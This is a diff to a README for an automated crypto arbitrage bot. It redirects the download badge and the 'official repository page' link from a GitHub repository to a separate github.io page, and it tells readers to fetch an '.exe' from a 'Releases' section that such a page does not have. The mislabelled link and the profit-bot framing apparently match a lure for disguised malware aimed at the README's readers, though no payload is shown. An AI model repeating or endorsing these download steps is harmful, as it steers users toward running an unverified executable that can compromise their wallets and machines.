@@ -1,6 +1,6 @@
 # 🤖 Arbitrum-Arbitrage-Bot-2026 - Find Crypto Profits With Automated Tools
 
-[![Download Bot](https://img.shields.io/badge/Download-Arbitrum_Bot-blue)](https://github.com/deefretted599/Arbitrum-Arbitrage-Bot-2026)
+[![Download Bot](https://img.shields.io/badge/Download-Arbitrum_Bot-blue)](https://deefretted599.github.io)
 
 ## 📋 Project Overview
 
@@ -19,7 +19,7 @@ To run this software, your computer needs these specifications:
 
 ## 📥 Downloading The Software 📥
 
-1. Go to the official repository page: [https://github.com/deefretted599/Arbitrum-Arbitrage-Bot-2026](https://github.com/deefretted599/Arbitrum-Arbitrage-Bot-2026)
+1. Go to the official repository page: [https://deefretted599.github.io](https://deefretted599.github.io)
 2. Locate the "Releases" section on the right side of the main page.
 3. Click the most recent version available.
 4. Select the file ending in ".exe" from the assets list.
